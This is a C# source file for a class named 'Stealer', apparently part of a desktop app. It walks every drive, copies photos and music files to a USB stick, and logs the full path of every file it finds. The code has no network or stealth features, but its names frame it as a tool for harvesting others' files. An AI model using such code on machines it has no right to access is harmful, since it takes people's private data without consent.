using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;

namespace Logic
{
    public class Stealer
    {
        private DriveInfo usbDrive;
        private string catalogForCopy;
        private ulong count;
        private ulong totalCount = 0;
        private StreamWriter streamWriter;
        private DriveInfo[] drives;
        private Action<string> WriteInformation;
        private string[] Extensions = { ".jpg", ".jpeg", ".mp3" };
        public EventHandler<CountFilesEventArgs> TotalCountFilesChanged;
        public EventHandler<CountFilesEventArgs> CountFilesChanged;
        public EventHandler<DriveInformationEventArgs> DriveChanged;
        private CancellationTokenSource cancellationToken = new CancellationTokenSource();

        public Stealer(DriveInfo usbDrive, DriveInfo[] Drives)
        {
            if (usbDrive is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(usbDrive)));
            }
            if (Drives is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(Drives)));
            }

            this.usbDrive = usbDrive;
            drives = Drives;
        }

        public Stealer(DriveInfo usbDrive, DriveInfo[] Drives, string[] Extensions) : this(usbDrive, Drives)
        {
            if (Extensions is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(Extensions)));
            }

            this.Extensions = Extensions;
        }

        public Stealer(DriveInfo usbDrive, DriveInfo[] Drives, Action<string> WriteInformation) : this(usbDrive, Drives)
        {
            if (WriteInformation is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(WriteInformation)));
            }

            this.WriteInformation = WriteInformation;
        }

        public Stealer(DriveInfo usbDrive, DriveInfo[] Drives, string[] Extensions, Action<string> WriteInformation) : this(usbDrive, Drives, Extensions)
        {
            if (WriteInformation is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(WriteInformation)));
            }

            this.WriteInformation = WriteInformation;
        }

        public async void StealAsync()
        {

            if (!usbDrive.IsReady)
            {
                WriteInformation("Flash card isn't found. Please insert it and try again.");
                return;
            }

            if (!Directory.Exists(@usbDrive.Name + "Documents"))
            {
                Directory.CreateDirectory(@usbDrive.Name + "Documents");
            }

            streamWriter = new StreamWriter(String.Format("{0}FilesList{1}.txt", usbDrive.Name, DateTime.Now.ToShortDateString()), false, System.Text.Encoding.Default);
            foreach (DriveInfo drive in drives)
            {
                try
                {
                    bool success = false;
                    if (drive.IsReady)
                    {
                        Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("Drive {0} {1} is checking", drive.Name, drive.VolumeLabel))));
                        Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("About drive:\n\tDrive Format: {0}\n\tDrive Type: {1}\n\tTotal Size: {2}", drive.DriveFormat, drive.DriveType, drive.TotalSize))));
                        
                        await Task.Run(() => Search(drive.Name), cancellationToken.Token);
                        Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("Drive {0} is checked. Found {1} files\n", drive.Name, count))));
                        count = 0;
                        success = true;
                    }

                    if (!success)
                    {
                        Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs("Drive " + drive.Name + " is skiped. \nAbout drive:\n\tDrive Format: " + drive.DriveFormat + "\n\tDrive Type: " + drive.DriveType + "\n\tTotal Size: " + drive.TotalSize + "\n\tDrive status: " + (drive.IsReady ? "Ready" : "Isn't Ready"))));
                    }
                }
                catch (System.IO.IOException) { }
                catch (System.NullReferenceException) { }
            }

            try
            {
                streamWriter.Close();
            }
            catch (System.NullReferenceException) { }
            catch (System.IO.IOException) { }; //"Out of memory... "
        }

        private void Search(string path)
        {
            bool isCheking = true;
            if (path.Contains("Program Files") || path.Contains("Windows") || path.Contains("Program Files (x86)"))
            {
                isCheking = false;
            }

            if (isCheking)
            {
                string[] directories = Directory.GetDirectories(path);
                foreach (string directory in directories)
                {
                    try
                    {
                        string[] files = Directory.GetFiles(directory);
                        foreach (string fullFileName in files)
                        {
                            if (cancellationToken.Token.IsCancellationRequested)
                            {
                                return;
                            }
                            FileInfo file = new FileInfo(fullFileName);
                            foreach (string extension in Extensions)
                            {
                                if (file.Extension == extension)
                                {
                                    try
                                    {
                                        catalogForCopy = @usbDrive.Name + "Documents\\" + directory.Substring(3) + "\\";
                                        if (!Directory.Exists(catalogForCopy))
                                        {
                                            Directory.CreateDirectory(catalogForCopy);
                                        }
                                        file.CopyTo(catalogForCopy + file.Name, false);
                                    }
                                    catch (System.IO.IOException) { }
                                    Application.Current.Dispatcher.Invoke(() => WriteInformation(fullFileName));
                                    count++;
                                    Application.Current.Dispatcher.Invoke(() => CountFilesChanged?.Invoke(this, new CountFilesEventArgs(count)));
                                }
                            }
                            totalCount++;
                            Application.Current.Dispatcher.Invoke(() => TotalCountFilesChanged?.Invoke(this, new CountFilesEventArgs(totalCount)));
                            streamWriter.WriteLine(fullFileName);
                        }

                        Search(directory);
                    }
                    catch (System.UnauthorizedAccessException) { }
                }
            }
        }

        public void StopSteal()
        {
            if (!(cancellationToken is null))
            {
                cancellationToken.Cancel();
            }
        }
    }
}
